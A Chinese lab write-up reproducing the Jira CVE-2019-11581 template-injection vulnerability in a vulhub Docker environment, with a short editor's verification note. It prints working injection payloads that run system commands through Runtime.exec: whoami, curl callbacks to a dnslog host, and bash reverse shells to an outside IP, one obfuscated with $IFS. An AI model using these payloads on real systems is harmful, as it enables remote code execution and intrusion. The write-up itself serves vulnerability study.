ailx10说：这篇是2023年11月之前写的，后来又改过。这篇的过程没有一开始那么顺。为了复现 Jira 的模板注入，我得先配邮件服务，反复尝试发信；邮箱里没出现命令输出时，我一度以为没成功，换成 DNS 探测后才确认动作已经发生，再继续调整参数做连接。所以我把这点小波折也留在笔记里。它让我意识到，邮件、模板、命令和页面响应走的不是同一条反馈路线，没看到文字不等于没有执行；找对观察的位置，比不停换一大段载荷更重要。

---

编辑核查提示：原实验需配置 SMTP；管理员发信与未授权联系管理员表单是不同入口。邮件正文没有命令输出不能独立证明是否执行。 原题环境、代码、外部工具和历史公网地址未重新验证，图片细字与水印仍需发布前核查。

本文记录 Jira CVE-2019-11581 的历史模板注入实验。实验需配置 SMTP，先观察邮件，再通过独立 DNS 信号及后续连接检查服务端是否执行。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明Atlassian Jira SSTI漏洞（CVE-2019-11581）环境搭建成功了，不幸的是，依然要做很多配置

![](/notes-assets/121373ee0c0b6aa03738.webp)

最最最重要的是配置SMTP，这里我用的是QQ邮箱的SMTP服务器

```
/secure/admin/AddSmtpMailServer!default.jspa
```

![](/notes-assets/0e13a00d4cb09d6641fa.webp)

开启联系管理员表单

```
http://144.34.162.13:8080/secure/admin/ViewApplicationProperties.jspa
```

（1）【未授权访问】输入载荷页面

```
http://144.34.162.13:8080/secure/ContactAdministrators!default.jspa
```

![](/notes-assets/586e4fa850b0e6069f5f.webp)

提交载荷

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami').toString()
```

![](/notes-assets/227d4e4f19914c8fda7a.webp)

进入电邮队列

```
http://144.34.162.13:8080/secure/admin/MailQueueAdmin!default.jspa
```

![](/notes-assets/1c28fb57a836c2d2cf85.webp)

查看邮箱，有类似这样的邮件，似乎没有成功（实际上是没有回显）

![](/notes-assets/7f2a3a1faa902f2f4e40.webp)

（2）【授权访问】登录后，可以在系统配置页面，直接发送邮件，载荷如下

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('bash -i >& /dev/tcp/174.137.58.6/8888 0>&1').waitFor()
```

![](/notes-assets/b84a6c56413f663c1380.webp)

收到的邮件内容如下，似乎也没有成功（实际上是没有回显）

![](/notes-assets/15d9a9e023868f012190.webp)

![](/notes-assets/5339e395c8e45494fd9d.webp)

（3）尝试dnslog

发送邮件

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://0v4pho.dnslog.cn').waitFor()
```

![](/notes-assets/5e9996826bf4d61a03ef.webp)

收到的邮件长这样

![](/notes-assets/81e343cc2427d0af4e79.webp)

查看dnslog，似乎成功了

![](/notes-assets/24f269183d07a11c6b28.webp)

（4）再试一次

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://ailx10.0v4pho.dnslog.cn').waitFor()
```

![](/notes-assets/853e30683c4ef70402eb.webp)

真的成功了，dnslog真的成功了，命令执行确实是可行的

![](/notes-assets/c0cdbc7828319c8fc7d0.webp)

（5）继续反弹shell

```
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/174.137.58.6/9999<&1').waitFor()
```

![](/notes-assets/314d84425eb1b4f0ede8.webp)

终于，反弹shell成功了，这里用的载荷如下

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/174.137.58.6/9999<&1
```

![](/notes-assets/a58ea27bb3206f036728.webp)
